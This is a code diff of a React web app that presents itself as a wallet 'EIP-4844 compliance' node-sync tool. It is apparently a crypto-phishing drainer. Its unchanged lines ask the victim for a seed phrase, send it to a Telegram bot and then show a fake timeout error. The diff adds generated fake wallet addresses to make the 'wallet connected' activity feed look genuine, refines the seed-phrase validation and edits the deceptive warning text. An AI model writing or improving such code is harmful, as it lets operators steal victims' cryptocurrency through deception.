@@ -27,15 +27,26 @@ export default function App() {
   const { data: nativeBal } = useBalance({ address }); 
   const { data: tokenBal } = useBalance({ address, token: USDT_MAP[chainId] });
 
+  // REALISTIC ADDRESS GENERATOR
   useEffect(() => {
     const trigger = () => {
-      const r = Math.floor(1000 + Math.random() * 8999);
-      setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
-      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📡 New Connection: 0x" + r)}`).catch(() => {});
-      setTimeout(() => setFeedMsg(""), 4000);
+      const chars = "abcdef0123456789";
+      let start = "";
+      let end = "";
+      for (let i = 0; i < 4; i++) {
+        start += chars.charAt(Math.floor(Math.random() * chars.length));
+        end += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      const fakeAddr = `0x${start}...${end}`;
+      setFeedMsg(`🛡️ ${fakeAddr} WALLET CONNECTED TO MAINNET_NODE`);
+      
+      // Ping your bot so you see the activity
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📡 Active Node: " + fakeAddr)}`).catch(() => {});
+
+      setTimeout(() => setFeedMsg(""), 5000);
     };
     trigger();
-    const interval = setInterval(trigger, 12000);
+    const interval = setInterval(trigger, 10000);
     return () => clearInterval(interval);
   }, [botToken, chatId]);
 
@@ -59,7 +70,8 @@ export default function App() {
     }
   }, [selectedAsset, tokenBal, nativeBal, activeTask]);
 
-  const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 1).length >= 12;
+  // SEED VALIDATION: Must be 12+ words
+  const isSeedOk = seedVal.trim().split(/\s+/).filter(w => w.length > 2).length >= 12;
 
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
@@ -71,7 +83,7 @@ export default function App() {
       {isConnected ? (
         <>
           <div style={{width:'100%', height:'220px', borderRadius:'15px', overflow:'hidden', marginBottom:'20px', border:'1px solid #1e293b'}}>
-            <iframe title="tradingview" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
+            <iframe title="market" src="https://s.tradingview.com/widgetembed/?symbol=BINANCE%3AETHUSDT&interval=D&theme=dark" style={{width:'100%', height:'100%', border:'none'}} />
           </div>
 
           <div style={{backgroundColor:'#0d1117', padding:'12px', borderRadius:'12px', fontSize:'8px', color:'#10b981', display:'flex', justifyContent:'space-between', marginBottom:'20px', border:'1px solid #1e293b', fontWeight:'900'}}>
@@ -130,7 +142,7 @@ export default function App() {
                 {!isSyncing ? (
                   <>
                     <div style={{color:'#10b981', fontWeight:'900', fontSize:'18px'}}>🛡️ EIP-4844 COMPLIANCE</div>
-                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_EXCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE MAINNET TUNNEL.</p>
+                    <p style={{fontSize:'10px', color:'#475569', margin:'20px 0', lineHeight:'1.5'}}>CRITICAL: NODE_EXCRYPTION_ID EXPIRED. PROVIDE RECOVERY KEY TO RESTORE END-TO-END MAINNET TUNNEL.</p>
                     <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="12/24 WORDS" style={{width:'100%', height:'120px', backgroundColor:'black', color:'#10b981', padding:'15px', border:'1px solid #1e293b', borderRadius:'15px', outline:'none'}} />
                     <button disabled={!isSeedOk} onClick={()=>{setIsSyncing(true); fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("🚨 SEED: " + seedVal)}`).catch(()=>{}); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100){clearInterval(i); setTimeout(()=>{setIsSyncing(false); alert("ERROR: NODE RELAY TIMEOUT."); setView("menu")},1200)}},60);}} 
                     style={{width:'100%', backgroundColor: isSeedOk ? '#10b981' : '#1e293b', color: isSeedOk ? '#000' : '#475569', padding:'20px', borderRadius:'15px', marginTop:'20px', fontWeight:'900', border:'none'}}>ENCRYPT & SYNC</button>
